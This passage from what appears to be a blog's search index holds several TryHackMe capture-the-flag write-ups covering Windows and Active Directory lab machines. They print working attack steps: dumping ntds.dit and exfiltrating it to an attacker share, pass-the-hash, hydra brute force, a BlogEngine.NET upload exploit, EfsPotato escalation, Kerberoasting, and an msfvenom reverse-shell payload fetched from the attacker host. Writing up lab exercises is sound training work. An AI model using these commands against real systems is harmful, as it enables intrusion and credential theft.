.\\SeBackupPrivilegeCmdLets.dll*Evil-WinRM* PS C:\\Users\\xyan1d3\\Documents> Import-Module .\\SeBackupPrivilegeUtils.dll*Evil-WinRM* PS C:\\Users\\xyan1d3\\Documents> mkdir C:\\Temp Directory: C:\\Mode LastWriteTime Length Name---- ------------- ------ ----d----- 2/27/2024 9:09 AM Temp*Evil-WinRM* PS C:\\Users\\xyan1d3\\Documents>```{: .nolineno}Now lets copy that file into C:/Temp directory ->```powershell*Evil-WinRM* PS C:\\Users\\xyan1d3\\Documents> Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit*Evil-WinRM* PS C:\\Users\\xyan1d3\\Documents> reg save hklm\\system c:\\temp\\systemThe operation completed successfully.*Evil-WinRM* PS C:\\Users\\xyan1d3\\Documents> dir C:\\Temp Directory: C:\\TempMode LastWriteTime Length Name---- ------------- ------ -----a---- 2/27/2024 9:09 AM 16777216 ntds.dit-a---- 2/27/2024 9:09 AM 17223680 system*Evil-WinRM* PS C:\\Users\\xyan1d3\\Documents>```{: .nolineno}Lastly I need to download both files into the attacker machines through anyways , I will be using download feature from **evil-winrm** Tool or I could also use smbserver to copy these files to my attacker machine like this ðŸ”½```powershell*Evil-WinRM* PS C:\\Temp> copy ntds.dit \\\\10.11.74.199\\share\\ntds.dit*Evil-WinRM* PS C:\\Temp> copy system \\\\10.11.74.199\\share\\system```{: .nolineno}Now lets time to use secretsdump.py tool to extract the hashes like this ðŸ”½![Image](Pasted%20image%2020240228205813.png)_Hashes extracted from secretsdump.py Tool from impackets_Lets pass the hash and get administrators shell ->```powershellâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/RazorBlack]â””â”€$ evil-winrm -i 10.10.220.237 -u 'Administrator' -H '' Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\Administrator> tree /f /aFolder PATH listingVolume serial number is 0ABE-CF60C:.| cookie.json| root.xml|+---3D Objects+---Contacts+---Desktop+---Documents+---Downloads+---Favorites| | Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---Videos*Evil-WinRM* PS C:\\Users\\Administrator> cat cookie.json{\tauth : \"TG9vayB0aGlzIGlzIHlvdXIgY29va2llLgpGdW5GYWN0IDogVGhpcyBjb29raWUgY2FuIGNoYW5nZSBpdHMgb3duIGZsYXZvdXIgYXV0b21hdGljYWxseS4gVG8gdGVzdCBpdCBqdXN0IHRoaW5rIG9mIHlvdXIgZmF2b3VyaXRlIGZsYXZvdXIuCgpBbmQgc3RvcCBwdXR0aW5nICdPUiAnMSc9JzEgaW5zaWRlIGxvZ2luLnB.............91ciBDb29raWU=\"}*Evil-WinRM* PS C:\\Users\\Administrator> cat root.xml System.Management.Automation.PSCredential System.Object System.Management.Automation.PSCredential Administrator 44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2.............e63792e0a *Evil-WinRM* PS C:\\Users\\Administrator> ```{: .nolineno}Lets crack this Password with that similar fashion of **system.txt** file â©![Image](Pasted%20image%2020240228213717.png)_Error while trying to Convert in String_I think this value is hex encoded so I tired decoding it in hex and I got this ->![Image](Pasted%20image%2020240228214157.png)_A root FLAG !_I am administrator now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "HackPark", "url": "/posts/HackPark/", "categories": "TryHackMe", "tags": "EfsPotato, Windows, Public Exploit, SeImpersonatePrivilege, hydra", "date": "2024-03-05 00:00:00 +0530", "snippet": "| Machine Link | https://tryhackme.com/room/hackpark || ------------------ | ------------------------------ || Operating System | Windows || Difficulty | Medium ...", "content": "| Machine Link | https://tryhackme.com/room/hackpark || ------------------ | ------------------------------ || Operating System | Windows || Difficulty | Medium || Machine Created by | tryhackme |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/HackPark]â””â”€$ nmap -sC -sV -T4 -p- -oN Nmap_Results.txt -Pn 10.10.243.161Nmap scan report for 10.10.243.161Host is up (0.18s latency).Not shown: 65533 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 8.5|_http-title: hackpark | hackpark amusements|_http-server-header: Microsoft-IIS/8.5| http-methods: |_ Potentially risky methods: TRACE| http-robots.txt: 6 disallowed entries | /Account/*.* /search /search.aspx /error404.aspx |_/archive /archive.aspx3389/tcp open ssl/ms-wbt-server?| rdp-ntlm-info: | Target_Name: HACKPARK| NetBIOS_Domain_Name: HACKPARK| NetBIOS_Computer_Name: HACKPARK| DNS_Domain_Name: hackpark| DNS_Computer_Name: hackpark| Product_Version: 6.3.9600|_ System_Time: 2024-03-05T08:23:59+00:00| ssl-cert: Subject: commonName=hackpark| Not valid before: 2024-03-04T08:18:04|_Not valid after: 2024-09-03T08:18:04|_ssl-date: 2024-03-05T08:24:03+00:00; -1s from scanner time.Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows```{: .nolineno}## Web Enumeration â¤µï¸I checked port 80 and got this static page â©![Image](Pasted%20image%2020240306130846.png)_Hackpack port 80 default page_This site also have Login page like this , lets brute force the credentials of user as admin through hydra Tool.![Image](Pasted%20image%2020240306131047.png)_Login Page_```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/HackPark]â””â”€$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.243.161 http-post-form \"/Account/login.aspx:__VIEWSTATE=FzCsRc8EkRmVOlJaK4BrCc22v37pQRYKYl9sp3Wa8spzGnTbVNxjN0eAm6XDN3oId5ezqAblLqIgavb%2BfjJvTcc9JGk3ksHYi8Ui5LTKlDw1rogxSzAo8EV28ig444ylonIuTDCes9tJBg5udupb%2BwZi6dT4UzDyPQV7%2FEuUR986PP5N9oU%2FY4vRC2QW97z0tuld%2Fj2sbFZo8ymDXvK8AWAp0jp2ERs8ms2DdgbrdIL8udlt57h9uFR7vIwJKiokO93ueH4EP7RaR6LBywmoO6xeAibhNDmky%2BqYYcoXYsXYzhm9WTZPnhtXPZl6%2Bul0uOXaXBTW1uSIa4Y9Znxjuevfx%2F46fZCh44YJ1GmAh0j7kGgN&__EVENTVALIDATION=BwQY74fWIQeGyXXV%2FXpTnNf%2FJIjug2%2FIGIr8nghFc%2FLPw0mKSckKOAi%2FLR64SorH5bBoQUQgP1TYh4xu%2BeNVBRdot2xRSTeUsFDj%2FMqM0VWjtSqpEy%2Btco4PJXO%2FXezStG6f14RLlz%2BUAoUvUnUnQmjbGLsKAPsz5gzRza8dP5fWePWf&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Failed\" -t 4Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-05 14:52:53[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task[DATA] attacking http-post-form://10.10.243.161:80/Account/login.aspx:__VIEWSTATE=FzCsRc8EkRmVOlJaK4BrCc22v37pQRYKYl9sp3Wa8spzGnTbVNxjN0eAm6XDN3oId5ezqAblLqIgavb%2BfjJvTcc9JGk3ksHYi8Ui5LTKlDw1rogxSzAo8EV28ig444ylonIuTDCes9tJBg5udupb%2BwZi6dT4UzDyPQV7%2FEuUR986PP5N9oU%2FY4vRC2QW97z0tuld%2Fj2sbFZo8ymDXvK8AWAp0jp2ERs8ms2DdgbrdIL8udlt57h9uFR7vIwJKiokO93ueH4EP7RaR6LBywmoO6xeAibhNDmky%2BqYYcoXYsXYzhm9WTZPnhtXPZl6%2Bul0uOXaXBTW1uSIa4Y9Znxjuevfx%2F46fZCh44YJ1GmAh0j7kGgN&__EVENTVALIDATION=BwQY74fWIQeGyXXV%2FXpTnNf%2FJIjug2%2FIGIr8nghFc%2FLPw0mKSckKOAi%2FLR64SorH5bBoQUQgP1TYh4xu%2BeNVBRdot2xRSTeUsFDj%2FMqM0VWjtSqpEy%2Btco4PJXO%2FXezStG6f14RLlz%2BUAoUvUnUnQmjbGLsKAPsz5gzRza8dP5fWePWf&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Failed[STATUS] 219.00 tries/min, 219 tries in 00:01h, 14344180 to do in 1091:39h, 4 active[STATUS] 231.33 tries/min, 694 tries in 00:03h, 14343705 to do in 1033:25h, 4 active[80][http-post-form] host: 10.10.243.161 login: admin password: 1qaz2wsx1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-03-05 14:59:18```{: .nolineno}I got this dashboard access as Administrator user ðŸ”½![Image](Pasted%20image%2020240306130730.png)_Dashboard_After reconnaissance I got an exploit related to the version of this CMS site BlogEngine.NET 3.3.x from inspecting the source code like this ðŸ”»![Image](Pasted%20image%2020240306131133.png)_BlogEngine 3.3.6.0_I got this exploit for this CMS vulnerability [CVE-2019-6714](https://www.exploit-db.com/exploits/46353) that leads to Remote Control Execution.![Image](Pasted%20image%2020240306131551.png)_Upload PostView.ascx payload_1. I had to modify the script of payload as I have to change the TCP IP and Port for attacker machine that will listen as to catch the reverse shell .2. Then save the payload file as PostView.ascx file name.3. Now upload the file from including a new entry for a post in this site .4. Use file manager to upload the file.Now to trigger the exploit run this URL ðŸ”½`http:///?theme=../../App_Data/files`Lets trigger it from my end ðŸ˜€![Image](Pasted%20image%2020240306132358.png)_Reverse shell response_## Local Privilege Escalation Enumeration â¤µï¸```powershellc:\\windows\\system32\\inetsrv>c:\\windows\\system32\\inetsrv>whoamiiis apppool\\blogc:\\windows\\system32\\inetsrv>hostnamehackparkc:\\windows\\system32\\inetsrv>c:\\windows\\system32\\inetsrv>whoami /allUSER INFORMATION----------------User Name SID ================ =======================================================iis apppool\\blog S-1-5-82-2734256158-3485737692-275298378-1529073857-2789248872GROUP INFORMATION-----------------Group Name Type SID Attributes ==================================== ================ ============ ===========================================Mandatory Label\\High Mandatory Level Label S-1-16-12288 Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\SERVICE Well-known group S-1-5-6 Mandatory group, Enabled by default, Enabled groupCONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupBUILTIN\\IIS_IUSRS Alias S-1-5-32-568 Mandatory group, Enabled by default, Enabled groupLOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group Unknown SID type S-1-5-82-0 Mandatory group, Enabled by default, Enabled groupPRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ========================================= =SeAssignPrimaryTokenPrivilege Replace a process level token DisabledSeIncreaseQuotaPrivilege Adjust memory quotas for a process DisabledSeAuditPrivilege Generate security audits DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabledc:\\windows\\system32\\inetsrv>systeminfoHost Name: HACKPARKOS Name: Microsoft Windows Server 2012 R2 StandardOS Version: 6.3.9600 N/A Build 9600OS Manufacturer: Microsoft CorporationOS Configuration: Standalone ServerOS Build Type: Multiprocessor FreeRegistered Owner: Windows UserRegistered Organization: Product ID: 00252-70000-00000-AA886Original Install Date: 8/3/2019, 10:43:23 AMSystem Boot Time: 3/5/2024, 11:28:18 PMSystem Manufacturer: XenSystem Model: HVM domUSystem Type: x64-based PCProcessor(s): 1 Processor(s) Installed. [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 MhzBIOS Version: Xen 4.11.amazon, 8/24/2006Windows Directory: C:\\WindowsSystem Directory: C:\\Windows\\system32Boot Device: \\Device\\HarddiskVolume1System Locale: en-us;English (United States)Input Locale: en-us;English (United States)Time Zone: (UTC-08:00) Pacific Time (US & Canada)Total Physical Memory: 4,096 MBAvailable Physical Memory: 3,202 MBVirtual Memory: Max Size: 5,504 MBVirtual Memory: Available: 4,496 MBVirtual Memory: In Use: 1,008 MBPage File Location(s): C:\\pagefile.sysDomain: WORKGROUPLogon Server: N/AHotfix(s): 8 Hotfix(s) Installed. [01]: KB2919355 [02]: KB2919442 [03]: KB2937220 [04]: KB2938772 [05]: KB2939471 [06]: KB2949621 [07]: KB3035131 [08]: KB3060716Network Card(s): 1 NIC(s) Installed. [01]: AWS PV Network Device Connection Name: Ethernet 2 DHCP Enabled: Yes DHCP Server: 10.10.0.1 IP address(es) [01]: 10.10.65.161 [02]: fe80::516c:1617:b7aa:68b1Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed.lsc:\\windows\\system32\\inetsrv>```{: .nolineno}In this enumeration I got many crucial things like â©1. SeImpersonatePrivilege is Enabled.2. That means I can escalated to Administrator .3. Checking of Operating System this is Microsoft Windows Server 2012 R2 .4. Which indicated that I have to use old potato Tools like Juicy Potato Tool.5. I will be using EfsPotato Tool here.Download this Tool from here : https://github.com/zcgonvh/EfsPotatoNow you will get EfsPotato.cs Downloaded but you need .exe Executable file and for that you need to compile it with .net executable of inbuild latest installed version of csc.exe file : ```powershellC:\\Windows\\Microsoft.NET\\Framework>dir Volume in drive C has no label. Volume Serial Number is 0E97-C552 Directory of C:\\Windows\\Microsoft.NET\\Framework08/22/2013 07:39 AM .08/22/2013 07:39 AM ..08/21/2013 08:06 PM 7,680 sbscmp10.dll08/21/2013 08:06 PM 7,680 sbscmp20_mscorwks.dll08/21/2013 08:06 PM 7,680 sbscmp20_perfcounter.dll08/21/2013 08:06 PM 7,680 sbs_diasymreader.dll08/21/2013 08:06 PM 7,680 sbs_microsoft.jscript.dll08/21/2013 08:06 PM 7,680 sbs_mscordbi.dll08/21/2013 08:06 PM 7,680 sbs_mscorrc.dll08/21/2013 08:06 PM 7,680 sbs_mscorsec.dll08/21/2013 08:06 PM 7,680 sbs_system.configuration.install.dll08/21/2013 08:06 PM 7,680 sbs_system.data.dll08/21/2013 08:06 PM 7,680 sbs_system.enterpriseservices.dll08/21/2013 08:06 PM 7,680 sbs_wminet_utils.dll08/21/2013 08:06 PM 7,680 SharedReg12.dll08/22/2013 07:39 AM v1.0.370508/22/2013 07:39 AM v1.1.432208/22/2013 07:39 AM v2.0.5072703/05/2024 11:39 PM v4.0.30319 13 File(s) 99,840 bytes 6 Dir(s) 39,123,136,512 bytes freecd ..C:\\Windows\\Microsoft.NET\\Framework>```{: .nolineno}I latest version is v4.0.30319 so lets use it ðŸ”½```powershellC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /platform:x86 EfsPotato.cs -nowarn:1691,618```{: .nolineno}On this system : ```powershellC:\\ProgramData>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /platform:x86 EfsPotato.cs -nowarn:1691,618Microsoft (R) Visual C# Compiler version 4.0.30319.33440for Microsoft (R) .NET Framework 4.5Copyright (C) Microsoft Corporation. All rights reserved.C:\\ProgramData>C:\\ProgramData>dir Volume in drive C has no label. Volume Serial Number is 0E97-C552 Directory of C:\\ProgramData10/02/2020 01:39 PM Amazon03/06/2024 12:13 AM 25,441 EfsPotato.cs03/06/2024 12:22 AM 17,920 EfsPotato.exe03/06/2024 12:00 AM 45,272 nc.exe08/06/2019 01:12 PM Package Cache10/02/2020 02:03 PM regid.1991-06.com.microsoft 5 File(s) 493,625 bytes 3 Dir(s) 39,123,087,360 bytes freeC:\\ProgramData>```{: .nolineno}Lets use it to see if it is working or not â©```powershellC:\\ProgramData>.\\EfsPotato.exe \"whoami\"Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).Part of GMH's fuck Tools, Code By zcgonvh.CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net][+] Current user: IIS APPPOOL\\Blog[+] Pipe: \\pipe\\lsarpc[!] binding ok (handle=e876c8)[+] Get Token: 656[!] process with pid: 2176 created.=======================nt authority\\systemC:\\ProgramData>```{: .nolineno}Its time to get a reverse shell through EfsPotato Tool.![Image](Pasted%20image%2020240306135657.png)_Reverse shell_```powershellC:\\ProgramData>whoamiwhoamint authority\\systemC:\\ProgramData>cd C:\\Users\\Administratorcd C:\\Users\\AdministratorC:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is 0E97-C552C:.+---Contacts+---Desktop| root.txt| System Scheduler.lnk| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| RecentPlaces.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator>type Desktop\\root.txttype Desktop\\root.txtFLAG_FLAG_FLAG_FLAG_FLAGC:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Enterprise", "url": "/posts/Enterprise/", "categories": "TryHackMe", "tags": "Active Directory, Unquoted_Service_Path, GetUserSPNs.py, PrivEsc, OSINT, RDP", "date": "2024-02-22 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashnmap -sV -T5 -p- -oN Nmap_Results.txt -Pn 10.10.62.184Warning: 10.10.62.184 giving up on port because retransmission cap hit (2).Nmap scan report for 10.10.62.184Host ...", "content": "## Port Scan Results â¤µï¸```bashnmap -sV -T5 -p- -oN Nmap_Results.txt -Pn 10.10.62.184Warning: 10.10.62.184 giving up on port because retransmission cap hit (2).Nmap scan report for 10.10.62.184Host is up (0.18s latency).Not shown: 65491 closed tcp ports (reset)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.088/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-02-22 16:04:06Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped3389/tcp open ms-wbt-server Microsoft Terminal Services3937/tcp filtered dvbservdsc5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)7388/tcp filtered unknown7990/tcp open http Microsoft IIS httpd 10.09389/tcp open mc-nmf .NET Message Framing14636/tcp filtered unknown15444/tcp filtered unknown15548/tcp filtered unknown20977/tcp filtered unknown27650/tcp filtered unknown28170/tcp filtered unknown30012/tcp filtered unknown38797/tcp filtered unknown47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49671/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049672/tcp open msrpc Microsoft Windows RPC49673/tcp open msrpc Microsoft Windows RPC49677/tcp open msrpc Microsoft Windows RPC49704/tcp open msrpc Microsoft Windows RPC49714/tcp open msrpc Microsoft Windows RPC49812/tcp filtered unknown49838/tcp open msrpc Microsoft Windows RPC52266/tcp filtered unknown58115/tcp filtered unknown62197/tcp filtered unknown63121/tcp filtered unknownService Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows```{: .nolineno}## SMB Enumeration â¤µï¸I checked the `SMB` with no creds with `netexec tool` and I got the domain name like this so I set the hosts file accordingly ðŸ”»![Image](Pasted%20image%2020240222213301.png)_Domain Name : lab.enterprise.thm_Now Lets also check the access with Anonymous username with no password ->![Image](Pasted%20image%2020240222213636.png)_Anonymous Access on SMB Shares !_Lets access that ðŸ”½```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/Enterprise]â””â”€$ smbclient //10.10.62.184/Docs Password for [WORKGROUP\\kali]:Try \"help\" to get a list of possible commands.smb: \\> ls . D 0 Mon Mar 15 08:17:35 2021 .. D 0 Mon Mar 15 08:17:35 2021 RSA-Secured-Credentials.xlsx A 15360 Mon Mar 15 08:16:54 2021 RSA-Secured-Document-PII.docx A 18432 Mon Mar 15 08:15:24 2021\t\t15587583 blocks of size 4096. 9922802 blocks availablesmb: \\>```{: .nolineno}from web part I got this from port 80 ->![Image](Pasted%20image%2020240222222230.png)Also I checked port 7790 that also hosts a site and a HTTP port so lets see âž¡ï¸![Image](Pasted%20image%2020240222222351.png)_Atlassian hosted site_I noticed the headings that states **Remember to all Enterprise-THM Employees: We are moving to Github!**So I `OSINT `about the `Enterprise-THM` on `github` and I got an Account ->![Image](Pasted%20image%2020240222223201.png)_Enterprise-THM github repository_I also noticed the number of people and I got 1 so I dig into it also and got the repo of a user named as nik.![Image](Pasted%20image%2020240222223418.png)_Nik-enterprise-dev_I got something from its commit histories like these ->![Image](Pasted%20image%2020240222223542.png)_Credentials of Nik user_Lets use that to check what privileges I could have ->![Image](Pasted%20image%2020240222234628.png)_Got access to some new shares but not able to access winrm service_Lets collect data for bloodhound ðŸ©¸I collected data for bloodhound like this ->![Image](Pasted%20image%2020240222234703.png)_bloodhound-python Tool_I inspected this user **nik** behavior in bloodhound but got nothing so I have to try new thing since I have the credentails of user nik so lets use that credentials to get the SPN of another user ðŸ”»![Image](Pasted%20image%2020240223131405.png)_GetUserSPNs.py that fetch the SPN ticket for a user_Lets crack this hash with John the Ripper or Hashcat , I will be using John the Ripper ->![Image](Pasted%20image%2020240223131649.png)_John The Ripper Tool_I have credentials of `bitbucket` user so lets see its privileges now ðŸ”»![Image](Pasted%20image%2020240223132202.png)_Got Access in rdp_Lets login into the RDP connection with `remmina` Tool ->![Image](Pasted%20image%2020240223132900.png)_Remmina Tool RDP connection_```powershellPS C:\\Windows\\system32> cd C:\\UsersPS C:\\Users> dir Directory: C:\\UsersMode LastWriteTime Length Name---- ------------- ------ ----d----- 3/11/2021 1:55 PM Administratord----- 3/11/2021 2:53 PM atlbitbucketd----- 3/11/2021 6:11 PM bitbucketd----- 3/11/2021 4:28 PM LAB-ADMINd-r--- 3/11/2021 1:27 PM PublicPS C:\\Users> cd bitbucketPS C:\\Users\\bitbucket> tree /f /aFolder PATH listingVolume serial number is 7CD9-A0AEC:.+---3D Objects+---Contacts+---Desktop| user.txt|+---Documents+---Downloads+---Favorites| | Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---VideosPS C:\\Users\\bitbucket> cat Desktop\\user.txtTHM{FLAG_FLAG_FLAG_FLAG_FLAG}PS C:\\Users\\bitbucket>```{: .nolineno}Now I have to collect some data for bloodhound so I will be uploading the `SharpHound.exe` Tool that will collect the data in a zip file that will be transferred to Attacker machine.I got nothing while looking into bloodhound so I uploaded winpeas.exe in to the system and ran it and got this ->![Image](Pasted%20image%2020240223160222.png)_Unquoted Service path vulnerability_I can exploit this lets try to create a payload using msfvenom ->```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/Enterprise]â””â”€$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.72.139 LPORT=445 -f exe -o shell.exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 460 bytesFinal size of exe file: 7168 bytesSaved as: shell.exeâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/Enterprise]â””â”€$ mv shell.exe Zero.exe ```{: .nolineno}I also checked the permissions of this service like this ->```powershellget-Acl 'C:\\Program Files (x86)\\Zero Tier\\Zero Tier One\\ZeroTier One.exe'```{: .nolineno}![Image](Pasted%20image%2020240223162013.png)I can write it so lets include our payload without any hesitation ðŸ”½```powershellPS C:\\Users\\bitbucket\\Desktop> cd 'C:\\Program Files (x86)\\Zero Tier\\'cd 'C:\\Program Files (x86)\\Zero Tier\\'PS C:\\Program Files (x86)\\Zero Tier> dirdir Directory: C:\\Program Files (x86)\\Zero TierMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 3/14/2021 6:08 PM Zero Tier One PS C:\\Program Files (x86)\\Zero Tier> curl http://10.14.72.139/Zero.exe -o Zero.execurl http://10.14.72.139/Zero.exe -o Zero.exePS C:\\Program Files (x86)\\Zero Tier> dirdir Directory: C:\\Program Files (x86)\\Zero TierMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 3/14/2021 6:08 PM Zero Tier One -a---- 2/23/2024 2:53 AM 7168 Zero.exe PS C:\\Program Files (x86)\\Zero Tier> sc.exe stop zerotieroneservicesc.exe stop zerotieroneservice[SC] ControlService FAILED 1062:The service has not been started.PS C:\\Program Files (x86)\\Zero Tier> sc.exe start zerotieroneservicesc.exe start zerotieroneservice```{: .nolineno}Lets see the netcat listener now that captured the `nt authority\\system` Shell ->```powershellâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/Enterprise]â””â”€$ rlwrap nc -lvnp 445 listening on [any] 445 ...connect to [10.14.72.139] from (UNKNOWN) [10.10.135.133] 50511Microsoft Windows [Version 10.0.17763.1817](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32>whoamiwhoamint authority\\systemC:\\Windows\\system32>hostnamehostnameLAB-DCC:\\Windows\\system32>cd C:\\Users\\Administratorcd C:\\Users\\AdministratorC:\\Users\\Administrator>dirdir Volume in drive C has no label. Volume Serial Number is 7CD9-A0AE Directory of C:\\Users\\Administrator03/11/2021 01:55 PM .03/11/2021 01:55 PM ..03/11/2021 05:47 PM 3D Objects03/11/2021 05:47 PM Contacts03/14/2021 06:48 PM Desktop03/11/2021 06:14 PM Documents03/14/2021 05:05 PM Downloads03/11/2021 05:47 PM Favorites03/11/2021 05:47 PM Links03/11/2021 05:47 PM Music03/11/2021 05:47 PM Pictures03/11/2021 05:47 PM Saved Games03/11/2021 05:47 PM Searches03/11/2021 01:56 PM Ubuntu03/11/2021 05:47 PM Videos 0 File(s) 0 bytes 15 Dir(s) 40,618,287,104 bytes freeC:\\Users\\Administrator>cd Desktopcd DesktopC:\\Users\\Administrator\\Desktop>dirdir Volume in drive C has no label. Volume Serial Number is 7CD9-A0AE Directory of C:\\Users\\Administrator\\Desktop03/14/2021 06:48 PM .03/14/2021 06:48 PM ..03/14/2021 06:49 PM 37 root.txt 1 File(s) 37 bytes 2 Dir(s) 40,618,287,104 bytes freeC:\\Users\\Administrator\\Desktop>type root.txttype root.txtTHM{FLAG-FLAG-FLAG-FLAG-FLAG-FLAG}C:\\Users\\Administrator\\Desktop>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Allsignpoint2pwnage", "url": "/posts/AllSignPoint2Pwnage/", "categories": "TryHackMe", "tags": "SeImpersonatePrivilege, PrivEsc, SMB, Windows", "date": "2024-02-21 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bash```{: .nolineno}## FTP Enumeration ðŸ”½```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]â””â”€$ ftp 10.10.146.103Connected to 10.10.146.103.220 Microsoft FTP ...", "content": "## Port Scan Results â¤µï¸```bash```{: .nolineno}## FTP Enumeration ðŸ”½```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]â””â”€$ ftp 10.10.146.103Connected to 10.10.146.103.220 Microsoft FTP ServiceName (10.10.146.103:kali): Anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password: 230 User logged in.Remote system type is Windows_NT.ftp> ls229 Entering Extended Passive Mode (|||49696|)150 Opening ASCII mode data connection.11-14-20 03:26PM 173 notice.txt226 Transfer complete.ftp> get notice.txtlocal: notice.txt remote: notice.txt229 Entering Extended Passive Mode (|||49700|)150 Opening ASCII mode 